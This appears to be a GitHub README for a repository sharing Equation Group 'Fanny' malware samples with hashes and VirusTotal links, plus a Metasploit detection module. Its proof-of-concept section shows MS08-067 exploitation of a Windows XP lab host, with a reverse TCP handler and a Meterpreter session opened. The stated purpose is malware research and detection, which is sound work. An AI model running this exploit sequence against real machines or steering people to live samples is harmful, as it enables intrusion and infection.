
#### For detection of fanny.bmp infections using MetaSploit,
#### you can now use my metasploit module avail. here: https://github.com/loneicewolf/metasploit_fanny_check_module/blob/main/fanny_bmp_check.rb
#### Documentation for 
#### the moudle avail. here: at the wiki  https://github.com/loneicewolf/fanny.bmp/wiki/Docs

-------------

## POCS

By-OS:

 - [x] Windows XP Pro (SP3)   Screenshot: https://user-images.githubusercontent.com/68499986/102911824-e2678280-447c-11eb-8495-7180a52c7266.png
 - [x] Windows 10 Pro N (x64) Screenshot: https://raw.githubusercontent.com/loneicewolf/fanny.bmp/main/Windows10%20X64%20fanny_bmp_check.png

-------------


All these I thought of earlier providing, since I was one of the people that got this on my USB stick (my USB got infected long long time ago, Years ago now.) - But now - when I looked closer and I saw that some of these isn't even available online (Some of them are, still - like fanny.bmp and maybe some others, and ECELP4.acm) but not any of mscorwin / comhost, etc. (If they are - I would love to hear that! and the source of it. The more sources of same malware - the better. It strengthens the "community" if I can put it that way. And it is easier to find if all material is gathered at one place.
But I thought of providing all of these to malware researchers. As well as for academical purposes.

-------------

##### Note: In the video I provided, I had slight problems with the USB Keyboard. So I wrote "EDUCATIONAK" but meant "EDUCATIONAL". Contact me for any details.

-------------

(Q) Why would you want to upload malware? You're literally providing CyberWeapons!
(A) I believe in Open-Source, and that even though in this scenario, can hopefully help malware researchers provide better protection.

But the major point, is actually - as said above, but adding the following reason:
- to help the feature find these malware and samples. As I think there are very little (if not none) of these **easily** accessible online. (Samples that is)

-------------

### To Detect fanny, refer to this article: 
- https://securelist.com/equation-the-death-star-of-malware-galaxy/68750/  (And some the others)  at "Indicators of compromise (“one of each”):"

And (for "optional" reading) I would suggest this one:
"AiR-ViBeR: Exfiltrating Data from Air-GappedComputers via Covert Surface ViBrAtIoNs." - writeup about Stuxnet,Fanny, Agent.btz (which is really like each others in ways) 


### POC:


First, Git clone the fanny_bmp_check.rb from https://github.com/loneicewolf/metasploit_fanny_check_module/blob/main/fanny_bmp_check.rb

place it into your msf folder, (important, check the following step before placing it) usually located in /root/.msf4/modules/

* make the following folders: (under each other) /post/windows/gather/forensics/ <fanny_bmp_check.rb here>

Start msfconsole

use exploit/windows/smb/ms08_067_netapi

set RHOST and LHOST.

    msf6 exploit(windows/smb/ms08_067_netapi) > run

      [*] Started reverse TCP handler on 192.168.122.1:4444 
      [*] 192.168.122.160:445 - Automatically detecting the target...
      [*] 192.168.122.160:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
      [*] 192.168.122.160:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
      [*] 192.168.122.160:445 - Attempting to trigger the vulnerability...
      [*] Sending stage (175174 bytes) to 192.168.122.160
      [*] Meterpreter session 4 opened (192.168.122.1:4444 -> 192.168.122.160:1043) at 2020-12-22 16:55:02 +0100

meterpreter > run post/windows/gather/forensics/fanny_bmp_check

    [*] Searching registry on WORKSTATION1 for Fanny.bmp artifacts.
    [+] WORKSTATION1: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\MediaResources\acm\ECELP4\Driver found in registry.
    [+] WORKSTATION1: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\MediaResources\acm\ECELP4\filter2 found in registry.
    [+] WORKSTATION1: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\MediaResources\acm\ECELP4\filter3 found in registry.
    [+] WORKSTATION1: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\MediaResources\acm\ECELP4\filter8 found in registry.
    [*] WORKSTATION1: 4 result(s) found in registry.







##  Fanny (and the other files, completely provided)
### includes:


- 
    - __d__.lnk - 148300b4c895bef313bee5eea9f40956510bc1e3878917cdd22baeabefb91179
    - https://www.virustotal.com/gui/file/148300b4c895bef313bee5eea9f40956510bc1e3878917cdd22baeabefb91179/detection

    - __e__.lnk - 276df113d13feaa98602918e09168ee4caadd3b797fdf7fcbe268f5741861bfa
    - https://www.virustotal.com/gui/file/276df113d13feaa98602918e09168ee4caadd3b797fdf7fcbe268f5741861bfa/detection

    - __f__.lnk - 8e1f99b858010fbf664419404a465ae98b51b40acc94231609367beca8e1652d
    - https://www.virustotal.com/gui/file/8e1f99b858010fbf664419404a465ae98b51b40acc94231609367beca8e1652d/detection

    - __g__.lnk - 6735dfcf86a0268e880429ebcc0062baa5515eaba69fd45cf4ea42b23f8e5809
    - https://www.virustotal.com/gui/file/6735dfcf86a0268e880429ebcc0062baa5515eaba69fd45cf4ea42b23f8e5809/detection

    - __h__.lnk - be1fd5a117142d2a80b6798058f66a0abea796986dae29e7902e6b0fe461a605
    - https://www.virustotal.com/gui/file/be1fd5a117142d2a80b6798058f66a0abea796986dae29e7902e6b0fe461a605/detection

    - __i__.lnk - 86f24cd880f445890c54883a40947fe103cceb92d5d3b17e7a9cf8143cdd04c9
    - https://www.virustotal.com/gui/file/86f24cd880f445890c54883a40947fe103cceb92d5d3b17e7a9cf8143cdd04c9/detection

    - __j__.lnk - 3696b414d8eaaaea4a9d220226e0e2ed458853eb1546959765aef8ccc0ba37b9
    - https://www.virustotal.com/gui/file/3696b414d8eaaaea4a9d220226e0e2ed458853eb1546959765aef8ccc0ba37b9/detection

    - comhost.dll - 0d9bb9a9e3a6f8836a1ef51862ae1c28f086da3a9006d1c7040fe57ed8c26231 
    - https://www.virustotal.com/gui/file/0d9bb9a9e3a6f8836a1ef51862ae1c28f086da3a9006d1c7040fe57ed8c26231/detection

    - mscorwin.dll - ef3135e462540adfba00234d75c4b21430f5a9037b61e7dc1014c8711ddc0047
    - https://www.virustotal.com/gui/file/ef3135e462540adfba00234d75c4b21430f5a9037b61e7dc1014c8711ddc0047/detection

    - shelldoc.dll - 6eb00b34d1daffa49b2f4c90841705b2c994563bde672bf35eb1c46cdb19a1ed
    - https://www.virustotal.com/gui/file/6eb00b34d1daffa49b2f4c90841705b2c994563bde672bf35eb1c46cdb19a1ed/detection

    - ECELP4.ACM - 787419d07f4bda9bc91072bb8644ed943089ad44f4bb5920bfe452dc111c244d
    - https://www.virustotal.com/gui/file/787419d07f4bda9bc91072bb8644ed943089ad44f4bb5920bfe452dc111c244d/detection

    - fanny.bmp - 0d9bb9a9e3a6f8836a1ef51862ae1c28f086da3a9006d1c7040fe57ed8c26231
    - https://www.virustotal.com/gui/file/0d9bb9a9e3a6f8836a1ef51862ae1c28f086da3a9006d1c7040fe57ed8c26231/detection

    - ~DE1923.tmp  -  c69a9157638e69fb692d827383c3f27e586e0c98989cffdf8bd4c982ad837a4c
    - https://www.virustotal.com/gui/file/c69a9157638e69fb692d827383c3f27e586e0c98989cffdf8bd4c982ad837a4c/detection

    - AGENTCPD.DLL - 1e77ae780e3f6389ffd6eae92887e531bf156943e31302c93be08a57ea90e6dd 
    - https://www.virustotal.com/gui/file/1e77ae780e3f6389ffd6eae92887e531bf156943e31302c93be08a57ea90e6dd/detection

    - dll_installer.dll [will provide soon]


### If you spot an mistake, please let me now.

------------

Urgent Contacts: (Malware Researchers)
Discord: Ken-Kaneki#3978
Mail:    william-martens@protonmail.ch

